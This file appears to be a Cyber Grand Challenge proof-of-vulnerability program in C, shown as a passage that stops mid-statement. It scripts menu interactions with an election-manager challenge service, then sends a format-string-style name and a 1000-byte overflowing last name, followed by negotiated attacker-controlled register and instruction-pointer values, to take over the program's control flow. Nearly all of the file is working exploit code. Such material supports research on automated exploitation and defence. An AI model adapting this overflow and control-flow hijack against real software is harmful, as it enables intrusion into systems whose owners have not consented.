#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {

   type1_vals t1vals = { 0 };
   uint32_t mask_eip, mask_reg;

   // We need to hack around the fact that POV Type 1 negotiation might choose 
   // an EIP that falls within our .text segment.
   //.text: 0x08048000 - 0x08146000
   // We do this in a simple manner by masking off the most significant nibble 
   // and then always choosing a non-zero value for it.
   mask_eip = 0x0EFEFEFE;
   mask_reg = 0x0EFEFEFE;
   cgc_type1_negotiate(mask_eip, mask_reg, 3, &t1vals);

   // Let's choose something non-zero for the most significant nibble.
   // Also set bit 0 to 1 in every 2nd byte to prevent '\n' and '\0'
   t1vals.ipval |= 0xF1010101;
   t1vals.regval |= 0xF1010101;

   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length cgc_read
      read_00000_len = 31;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00000_00000[] = 
         "\x31\x37\x3a\x20\x43\x72\x65\x61\x74\x65\x20\x45\x6c\x65\x63\x74"
         "\x69\x6f\x6e\x0a\x00\x39\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 31);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length cgc_read
      read_00001_len = 19;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00001_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 19);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x31\x37\x0a";
      static unsigned int write_00000_00000_len = 3;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length cgc_read
      read_00002_len = 31;
      read_00002 = (unsigned char*)cgc_malloc(read_00002_len);
      int read_00002_res = cgc_length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00002_00000[] = 
         "\x23\x23\x20\x43\x72\x65\x61\x74\x65\x20\x65\x6c\x65\x63\x74\x69"
         "\x6f\x6e\x20\x6d\x61\x6e\x61\x67\x65\x72\x20\x23\x23\x0a\x00";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 31);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length cgc_read
      read_00003_len = 20;
      read_00003 = (unsigned char*)cgc_malloc(read_00003_len);
      int read_00003_res = cgc_length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00003_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x66\x69\x72\x73\x74\x20\x6e\x61\x6d"
         "\x65\x3a\x20\x00";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 20);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x71\x4d\x4f\x44\x77\x72\x6c\x48\x53\x51\x67\x4d\x6f\x47\x71\x55"
         "\x71\x4c\x67\x74\x6c\x4d\x57\x64\x58\x6b\x61\x67\x0a";
      static unsigned int write_00001_00000_len = 29;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length cgc_read
      read_00004_len = 19;
      read_00004 = (unsigned char*)cgc_malloc(read_00004_len);
      int read_00004_res = cgc_length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00004_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00004_ptr += cgc_data_match(read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, match_00004_00000, 19);
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x45\x6b\x45\x61\x56\x68\x50\x6c\x41\x52\x79\x50\x70\x45\x6a\x6d"
         "\x4a\x59\x59\x55\x4a\x66\x68\x75\x48\x63\x43\x74\x48\x6c\x0a";
      static unsigned int write_00002_00000_len = 31;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length cgc_read
      read_00005_len = 20;
      read_00005 = (unsigned char*)cgc_malloc(read_00005_len);
      int read_00005_res = cgc_length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00005_00000[] = 
         "\x09\x59\x6f\x75\x72\x20\x49\x44\x20\x6e\x75\x6d\x62\x65\x72\x20"
         "\x69\x73\x3a\x20";
      read_00005_ptr += cgc_data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 20);
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** length cgc_read
      read_00006_len = 9;
      read_00006 = (unsigned char*)cgc_malloc(read_00006_len);
      int read_00006_res = cgc_length_read(0, read_00006, read_00006_len);
      if (read_00006_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00006_00000[] = 
         "\x31\x30\x31\x30\x31\x30\x31\x30\x0a";
      read_00006_ptr += cgc_data_match(read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, match_00006_00000, 9);
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** length cgc_read
      read_00007_len = 19;
      read_00007 = (unsigned char*)cgc_malloc(read_00007_len);
      int read_00007_res = cgc_length_read(0, read_00007, read_00007_len);
      if (read_00007_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00007_00000[] = 
         "\x09\x59\x6f\x75\x72\x20\x61\x75\x74\x68\x20\x6b\x65\x79\x20\x69"
         "\x73\x3a\x20";
      read_00007_ptr += cgc_data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 19);
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** delimited cgc_read
      static unsigned char read_00008_delim[] = 
         "\x0a";
      read_00008 = NULL;
      read_00008_len = 0;
      int read_00008_res = cgc_delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 1);
      if (read_00008_res) {} //silence unused variable warning
      //**** cgc_read assign to var "authkey" from slice
      cgc_assign_from_slice("authkey", read_00008, read_00008_len - read_00008_ptr, 0, 0, 1);
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** length cgc_read
      read_00009_len = 22;
      read_00009 = (unsigned char*)cgc_malloc(read_00009_len);
      int read_00009_res = cgc_length_read(0, read_00009, read_00009_len);
      if (read_00009_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00009_00000[] = 
         "\x45\x6e\x74\x65\x72\x20\x65\x6c\x65\x63\x74\x69\x6f\x6e\x20\x6e"
         "\x61\x6d\x65\x3a\x20\x00";
      read_00009_ptr += cgc_data_match(read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, match_00009_00000, 22);
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x72\x62\x63\x42\x6d\x47\x5a\x64\x55\x6b\x73\x6e\x68\x57\x4e\x53"
         "\x48\x0a";
      static unsigned int write_00003_00000_len = 18;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** length cgc_read
      read_00010_len = 43;
      read_00010 = (unsigned char*)cgc_malloc(read_00010_len);
      int read_00010_res = cgc_length_read(0, read_00010, read_00010_len);
      if (read_00010_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00010_00000[] = 
         "\x45\x6e\x74\x65\x72\x20\x6e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20"
         "\x65\x6c\x65\x63\x74\x69\x6f\x6e\x20\x77\x69\x6e\x6e\x65\x72\x73"
         "\x20\x64\x65\x73\x69\x72\x65\x64\x3a\x20\x00";
      read_00010_ptr += cgc_data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 43);
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x33\x0a";
      static unsigned int write_00004_00000_len = 2;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** length cgc_read
      read_00011_len = 45;
      read_00011 = (unsigned char*)cgc_malloc(read_00011_len);
      int read_00011_res = cgc_length_read(0, read_00011, read_00011_len);
      if (read_00011_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00011_00000[] = 
         "\x45\x6e\x74\x65\x72\x20\x74\x68\x65\x20\x6d\x61\x78\x20\x6e\x75"
         "\x6d\x62\x65\x72\x20\x6f\x66\x20\x63\x61\x6e\x64\x69\x64\x61\x74"
         "\x65\x73\x20\x61\x6c\x6c\x6f\x77\x65\x64\x3a\x20\x00";
      read_00011_ptr += cgc_data_match(read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, match_00011_00000, 45);
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x31\x31\x0a";
      static unsigned int write_00005_00000_len = 3;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** length cgc_read
      read_00012_len = 46;
      read_00012 = (unsigned char*)cgc_malloc(read_00012_len);
      int read_00012_res = cgc_length_read(0, read_00012, read_00012_len);
      if (read_00012_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00012_00000[] = 
         "\x43\x61\x6e\x20\x76\x6f\x74\x65\x72\x73\x20\x77\x72\x69\x74\x65"
         "\x2d\x69\x6e\x20\x6e\x65\x77\x20\x63\x61\x6e\x64\x69\x64\x61\x74"
         "\x65\x73\x3f\x20\x28\x59\x79\x2f\x4e\x6e\x29\x3a\x20\x00";
      read_00012_ptr += cgc_data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 46);
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x59\x0a";
      static unsigned int write_00006_00000_len = 2;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** length cgc_read
      read_00013_len = 19;
      read_00013 = (unsigned char*)cgc_malloc(read_00013_len);
      int read_00013_res = cgc_length_read(0, read_00013, read_00013_len);
      if (read_00013_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00013_00000[] = 
         "\x45\x6c\x65\x63\x74\x69\x6f\x6e\x20\x43\x72\x65\x61\x74\x65\x64"
         "\x2e\x0a\x00";
      read_00013_ptr += cgc_data_match(read_00013 + read_00013_ptr, read_00013_len - read_00013_ptr, match_00013_00000, 19);
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** length cgc_read
      read_00014_len = 41;
      read_00014 = (unsigned char*)cgc_malloc(read_00014_len);
      int read_00014_res = cgc_length_read(0, read_00014, read_00014_len);
      if (read_00014_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00014_00000[] = 
         "\x31\x34\x3a\x20\x4c\x6f\x67\x69\x6e\x0a\x00\x33\x38\x2e\x20\x52"
         "\x65\x67\x69\x73\x74\x65\x72\x20\x56\x6f\x74\x65\x72\x0a\x00\x39"
         "\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00014_ptr += cgc_data_match(read_00014 + read_00014_ptr, read_00014_len - read_00014_ptr, match_00014_00000, 41);
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** length cgc_read
      read_00015_len = 19;
      read_00015 = (unsigned char*)cgc_malloc(read_00015_len);
      int read_00015_res = cgc_length_read(0, read_00015, read_00015_len);
      if (read_00015_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00015_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00015_ptr += cgc_data_match(read_00015 + read_00015_ptr, read_00015_len - read_00015_ptr, match_00015_00000, 19);
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x33\x38\x0a";
      static unsigned int write_00007_00000_len = 3;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** length cgc_read
      read_00016_len = 20;
      read_00016 = (unsigned char*)cgc_malloc(read_00016_len);
      int read_00016_res = cgc_length_read(0, read_00016, read_00016_len);
      if (read_00016_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00016_00000[] = 
         "\x23\x23\x20\x43\x72\x65\x61\x74\x65\x20\x76\x6f\x74\x65\x72\x20"
         "\x23\x23\x0a\x00";
      read_00016_ptr += cgc_data_match(read_00016 + read_00016_ptr, read_00016_len - read_00016_ptr, match_00016_00000, 20);
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length cgc_read
      read_00017_len = 20;
      read_00017 = (unsigned char*)cgc_malloc(read_00017_len);
      int read_00017_res = cgc_length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00017_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x66\x69\x72\x73\x74\x20\x6e\x61\x6d"
         "\x65\x3a\x20\x00";
      read_00017_ptr += cgc_data_match(read_00017 + read_00017_ptr, read_00017_len - read_00017_ptr, match_00017_00000, 20);
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x25\x53\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55"
         "\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55\x25\x55"
         "\x0a";
      static unsigned int write_00008_00000_len = 33;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** length cgc_read
      read_00018_len = 19;
      read_00018 = (unsigned char*)cgc_malloc(read_00018_len);
      int read_00018_res = cgc_length_read(0, read_00018, read_00018_len);
      if (read_00018_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00018_00000[] = 
         "\x09\x45\x6e\x74\x65\x72\x20\x6c\x61\x73\x74\x20\x6e\x61\x6d\x65"
         "\x3a\x20\x00";
      read_00018_ptr += cgc_data_match(read_00018 + read_00018_ptr, read_00018_len - read_00018_ptr, match_00018_00000, 19);
      cgc_free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x66\x6e\x46\x4e\x48\x6e\x76\x7a\x6b\x76\x53\x57\x5a\x72\x58\x46"
         "\x4d\x55\x4d\x46\x42\x73\x59\x47\x6a\x63\x55\x62\x55\x55\x76\x78"
         "\x56\x50\x72\x62\x51\x78\x7a\x6e\x58\x6d\x55\x6f\x72\x4f\x51\x50"
         "\x50\x42\x70\x56\x48\x68\x73\x67\x76\x79\x56\x6e\x4a\x46\x55\x4b"
         "\x4c\x41\x4d\x78\x41\x69\x68\x75\x61\x48\x69\x78\x41\x67\x47\x67"
         "\x7a\x41\x6b\x4f\x4d\x4f\x4d\x67\x46\x6a\x67\x71\x73\x78\x42\x44"
         "\x48\x67\x4c\x6a\x73\x51\x56\x6d\x51\x55\x72\x50\x46\x4d\x65\x74"
         "\x61\x4c\x46\x77\x46\x73\x61\x4f\x50\x74\x68\x7a\x6b\x42\x64\x72"
         "\x47\x7a\x51\x57\x45\x46\x42\x58\x6e\x4d\x4c\x65\x61\x54\x58\x53"
         "\x67\x4e\x69\x58\x6d\x64\x48\x78\x61\x43\x4f\x69\x4d\x72\x79\x4f"
         "\x64\x50\x70\x74\x67\x5a\x77\x79\x7a\x55\x45\x47\x56\x47\x6b\x78"
         "\x4a\x72\x75\x76\x4d\x53\x59\x51\x7a\x73\x43\x4e\x7a\x50\x67\x4d"
         "\x69\x79\x65\x57\x71\x79\x6e\x57\x6d\x66\x51\x7a\x76\x55\x67\x4a"
         "\x45\x57\x76\x47\x4a\x4c\x72\x43\x69\x47\x4d\x67\x53\x49\x69\x49"
         "\x57\x50\x4d\x6a\x70\x48\x66\x51\x46\x76\x50\x72\x6c\x56\x76\x69"
         "\x61\x57\x73\x56\x74\x6d\x71\x72\x4e\x52\x6d\x4f\x44\x6c\x61\x59"
         "\x66\x49\x56\x78\x44\x47\x55\x79\x4f\x5a\x5a\x58\x79\x57\x64\x4e"
         "\x4d\x43\x48\x79\x70\x67\x6a\x4e\x68\x54\x6e\x73\x6c\x68\x78\x4a"
         "\x45\x4f\x4e\x4b\x71\x66\x68\x43\x68\x54\x63\x6a\x56\x4e\x68\x54"
         "\x4d\x6d\x75\x45\x43\x69\x55\x4a\x72\x41\x5a\x44\x64\x69\x56\x52"
         "\x41\x4a\x69\x56\x72\x53\x74\x79\x70\x75\x68\x52\x63\x7a\x74\x52"
         "\x71\x77\x43\x74\x75\x54\x43\x58\x79\x76\x4b\x53\x77\x77\x6b\x79"
         "\x42\x68\x47\x44\x43\x79\x77\x63\x4b\x6d\x6c\x48\x4b\x43\x4c\x4b"
         "\x66\x5a\x6e\x5a\x62\x61\x43\x44\x46\x76\x4c\x47\x47\x69\x52\x57"
         "\x4c\x70\x4a\x6c\x66\x76\x77\x67\x66\x54\x48\x62\x4a\x76\x64\x44"
         "\x73\x45\x75\x45\x53\x51\x51\x54\x52\x59\x61\x51\x53\x59\x6a\x61"
         "\x72\x72\x6b\x69\x56\x55\x43\x41\x6a\x4f\x49\x43\x6e\x63\x52\x5a"
         "\x50\x43\x70\x6a\x42\x5a\x5a\x46\x6e\x50\x69\x4f\x41\x45\x7a\x62"
         "\x6b\x4c\x68\x42\x41\x44\x4c\x43\x73\x61\x58\x49\x50\x77\x69\x6d"
         "\x72\x7a\x55\x4f\x65\x73\x71\x6b\x51\x69\x74\x54\x6d\x62\x76\x7a"
         "\x53\x76\x53\x64\x7a\x4a\x54\x6e\x4c\x6b\x49\x50\x54\x65\x6b\x48"
         "\x54\x6d\x74\x48\x4e\x41\x46\x4b\x78\x6b\x7a\x76\x6e\x75\x78\x77"
         "\x61\x55\x59\x62\x69\x59\x57\x69\x59\x49\x78\x52\x77\x58\x58\x5a"
         "\x49\x67\x50\x66\x78\x6e\x4f\x72\x73\x4b\x63\x68\x49\x68\x4c\x46"
         "\x78\x58\x6a\x41\x5a\x53\x41\x42\x6e\x74\x68\x44\x52\x41\x52\x45"
         "\x59\x46\x72\x66\x74\x79\x47\x69\x4d\x42\x62\x77\x6b\x6e\x45\x5a"
         "\x76\x6d\x74\x59\x43\x67\x49\x58\x65\x61\x46\x78\x53\x4d\x7a\x79"
         "\x4a\x52\x45\x4f\x7a\x51\x4c\x6f\x79\x64\x4b\x70\x50\x74\x4e\x4e"
         "\x41\x44\x44\x44\x41\x79\x50\x44\x53\x66\x42\x42\x79\x72\x43\x58"
         "\x5a\x74\x66\x79\x56\x79\x6b\x42\x45\x64\x74\x73\x48\x49\x4d\x48"
         "\x4c\x6c\x44\x44\x7a\x61\x6c\x70\x53\x7a\x75\x49\x5a\x70\x46\x50"
         "\x65\x78\x55\x45\x72\x79\x6d\x6a\x58\x62\x72\x63\x43\x65\x6b\x66"
         "\x47\x58\x76\x75\x54\x78\x6e\x47\x41\x46\x62\x7a\x69\x6b\x52\x6b"
         "\x62\x6e\x57\x46\x68\x64\x49\x51\x68\x43\x4b\x58\x41\x41\x4a\x79"
         "\x71\x4a\x5a\x4b\x4a\x67\x47\x62\x51\x50\x67\x74\x76\x4f\x53\x6e"
         "\x51\x70\x56\x76\x6c\x4a\x71\x48\x76\x4a\x74\x52\x4f\x64\x69\x4a"
         "\x72\x4c\x6a\x47\x42\x67\x73\x4b\x74\x46\x4c\x76\x77\x70\x66\x4f"
         "\x50\x4f\x58\x4f\x4c\x4f\x43\x6b\x58\x48\x67\x48\x4b\x79\x73\x77"
         "\x58\x6f\x55\x6e\x77\x63\x6f\x4f\x41\x77\x4f\x45\x42\x59\x41\x4c"
         "\x77\x47\x42\x73\x67\x47\x5a\x42\x7a\x7a\x51\x67\x6b\x66\x51\x6f"
         "\x52\x48\x68\x73\x69\x78\x77\x78\x4d\x69\x42\x54\x64\x66\x74\x76"
         "\x63\x64\x4c\x75\x4c\x65\x45\x71\x6d\x46\x4a\x63\x5a\x45\x66\x72"
         "\x52\x74\x6d\x4b\x78\x49\x67\x77\x4f\x71\x6e\x6a\x54\x4b\x47\x56"
         "\x42\x77\x6f\x6c\x4b\x67\x4e\x65\x73\x43\x70\x59\x70\x4f\x46\x43"
         "\x51\x55\x55\x77\x50\x77\x59\x4e\x68\x56\x76\x5a\x55\x44\x52\x64"
         "\x57\x4d\x75\x47\x6a\x79\x52\x4d\x4f\x44\x68\x62\x69\x6e\x61\x6a"
         "\x4f\x42\x43\x54\x47\x61\x6d\x71\x75\x4e\x4a\x42\x4f\x77\x61\x47"
         "\x46\x59\x78\x6b\x7a\x4c\x49\x43\x56\x79\x72\x50\x5a\x6b\x6c\x4c"
         "\x68\x6b\x62\x6a\x52\x63\x57\x44\x4f\x78\x70\x64\x76\x57\x62\x67"
         "\x79\x59\x4f\x59\x4e\x64\x67\x78\x61\x66\x44\x6c\x6a\x6b\x75\x43"
         "\x61\x6e\x42\x71\x49\x61\x52\x43\x41\x63\x75\x70\x62\x68\x76\x43"
         "\x51\x53\x6d\x6c\x63\x4d\x77\x45\x43\x4e\x4d\x52\x79\x6c\x54\x58"
         "\x6f\x41\x57\x71\x48\x62\x72\x6f";
      static unsigned int write_00009_00000_len = 1000;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);

   // cgc_write TYPE1_REG
   cgc_transmit_all(1, &t1vals.regval, 4);
   // do {
   //    //*** writing data
   //    unsigned char *write_00010 = NULL;
   //    unsigned int write_00010_len = 0;
   //    write_00010 = append_var("TYPE1_REG", write_00010, &write_00010_len);
   //    if (write_00010_len > 0) {
   //       cgc_transmit_all(1, write_00010, write_00010_len);
   //    }
   //    free(write_00010);
   // } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x72\x71\x59\x70";
      static unsigned int write_00011_00000_len = 4;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);

   // cgc_write TYPE1_IP
   cgc_transmit_all(1, &t1vals.ipval, 4);
   // do {
   //    //*** writing data
   //    unsigned char *write_00012 = NULL;
   //    unsigned int write_00012_len = 0;
   //    write_00012 = append_var("TYPE1_IP", write_00012, &write_00012_len);
   //    if (write_00012_len > 0) {
   //       cgc_transmit_all(1, write_00012, write_00012_len);
   //    }
   //    free(write_00012);
   // } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x0a";
      static unsigned int write_00013_00000_len = 1;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = cgc_append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         cgc_transmit_all(1, write_00013, write_00013_len);
      }
      cgc_free(write_00013);
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** length cgc_read
      read_00019_len = 20;
      read_00019 = (unsigned char*)cgc_malloc(read_00019_len);
      int read_00019_res = cgc_length_read(0, read_00019, read_00019_len);
      if (read_00019_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00019_00000[] = 
         "\x09\x59\x6f\x75\x72\x20\x49\x44\x20\x6e\x75\x6d\x62\x65\x72\x20"
         "\x69\x73\x3a\x20";
      read_00019_ptr += cgc_data_match(read_00019 + read_00019_ptr, read_00019_len - read_00019_ptr, match_00019_00000, 20);
      cgc_free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00020;
      unsigned int read_00020_len;
      unsigned int read_00020_ptr = 0;
      //**** length cgc_read
      read_00020_len = 9;
      read_00020 = (unsigned char*)cgc_malloc(read_00020_len);
      int read_00020_res = cgc_length_read(0, read_00020, read_00020_len);
      if (read_00020_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00020_00000[] = 
